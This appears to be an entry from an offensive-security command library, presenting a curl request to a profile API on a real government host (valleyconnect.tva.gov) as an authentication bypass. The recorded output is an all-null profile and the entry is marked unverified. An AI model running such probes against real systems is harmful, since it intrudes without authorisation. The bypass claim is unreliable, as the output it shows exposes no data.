---
id: cmd-tva-profile-get
name: get-valleyconnect-profile-api
type: command
executor: bash
data: >-
  curl -X GET
  https://valleyconnect.tva.gov/customapi/v1/user/getbasicprofileinfo -H "Host:
  valleyconnect.tva.gov"
output: '{"username":null,"email":null,"orgId":null,"hasRemoteAssistanceGrant":false}'
created_at: '2023-10-17T00:00:00Z'
updated_at: '2025-12-14T17:31:52.462Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api
  - auth-bypass
verified: false
validated: true
submitted: true
---

# get-valleyconnect-profile-api

## Command

```bash
curl -X GET https://valleyconnect.tva.gov/customapi/v1/user/getbasicprofileinfo -H "Host: valleyconnect.tva.gov"
```

## Description

Sends an unauthenticated GET request to the ValleyConnect profile API, demonstrating bypass by returning null user details in JSON.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `https://valleyconnect.tva.gov/customapi/v1/user/getbasicprofileinfo` | Target API endpoint | Yes |
| `-H "Host: valleyconnect.tva.gov"` | Sets the Host header for HTTP/2 compatibility | Yes |

## Examples

### Basic Usage

```bash
curl -X GET https://valleyconnect.tva.gov/customapi/v1/user/getbasicprofileinfo -H "Host: valleyconnect.tva.gov"
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X GET https://valleyconnect.tva.gov/customapi/v1/user/getbasicprofileinfo -H "Host: valleyconnect.tva.gov"
```

## Expected Output

HTTP/2 200 OK with Content-Type: application/json; charset=utf-8 and body: {"username":null,"email":null,"orgId":null,"hasRemoteAssistanceGrant":false}

## Related

- [[procedures/Retrieve-Basic-Profile-Info-via-API-Without-Authentication]]
